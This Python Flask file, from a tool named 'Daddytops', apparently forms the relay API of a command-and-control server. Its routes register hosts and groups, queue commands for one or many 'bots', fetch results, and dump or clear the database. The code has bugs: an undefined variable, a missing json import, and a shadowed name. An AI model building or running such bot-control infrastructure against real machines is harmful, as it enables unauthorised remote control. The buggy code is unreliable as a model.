from flask import Flask, request
from . import app
import requests

core = "http://172.69.1.1:9999"

@app.route('/', methods=['GET'])
@app.route('/status', methods=['GET'])
def index():
    return "Daddytops is running.\n"


@app.route('/register/host', methods=['POST'])
def newhost():
    content = request.json
    try:
        hostname = content['hostname']
        interface = content['interface']
        groupname = content['groupname']
    except:
        return "Missing required fields"
    header = {'Content-type': 'application/json'}
    data = {"hostname": hostname, "interface": interface, "groupname": groupname}
    request = requests.post(server + "/register/host", headers=header, data=json.dumps(data))
    return request.text

@app.route('/register/group', methods=['POST'])
def newgroup():
    content = request.json
    try:
        groupname = content['groupname']
    except:
        return "Missing required field"
    header = {'Content-type': 'application/json'}
    data = {"groupname": groupname}
    request = requests.post(core + "/register/group", headers=header, data=json.dumps(data))
    return request.text


@app.route('/add/command/single', methods=['POST'])
def newaction():
    content = request.json
    try:
        hostname = content['hostname']
        mode = content['mode']
        arguments = content['arguments']
        options = content['options']
    except:
        return "Missing required field"
    header = {'Content-type': 'application/json'}
    data = {"hostname": hostname, "mode": mode, "arguments": arguments, "options": options}
    request = requests.post(core + "/add/command/single", headers=header, data=json.dumps(data))
    return request.text

@app.route('/add/command/group', methods=['POST'])
def newgroupaction():
    content = request.json
    try:
        groupname = content['groupname']
        mode = content['mode']
        arguments = content['arguments']
        options = content['options']
    except:
        return "Missing required field"
    header = {'Content-type': 'application/json'}
    data = {"groupname": groupname, "mode": mode, "arguments": arguments, "options": options}
    request = requests.post(core + "/add/command/group", headers=header, data=json.dumps(data))
    return request.text


@app.route('/get/actionresult', methods=['POST'])
def getactionresult():
    content = request.json
    try:
        aid = content['actionid']
    except:
        return "Missing required field"
    header = {'Content-type': 'application/json'}
    data = {"actionid": aid}
    request = requests.post(core + "/get/actionresult", headers=header, data=json.dumps(data))
    return request.text

@app.route('/list/bots', methods=['GET'])
def listbots():
    data = requests.get(core + "/list/bots")
    return data

@app.route('/list/hosts', methods=['GET'])
def listhosts():
    data = requests.get(core + "/list/hosts")
    return data

@app.route('/list/groups', methods=['GET'])
def listgroups():
    data = requests.get(core + "/list/groups")
    return data

@app.route('/list/actions', methods=['GET'])
def listactions():
    data = requests.get(core + "/list/actions")
    return data

@app.route('/dumpdb', methods=['GET'])
def dumpdb():
    data = requests.get(core + "/dumpdb")
    return data

@app.route('/cleardb', methods=['GET'])
def cleardb():
    data = requests.get(core + "/cleardb")
    return data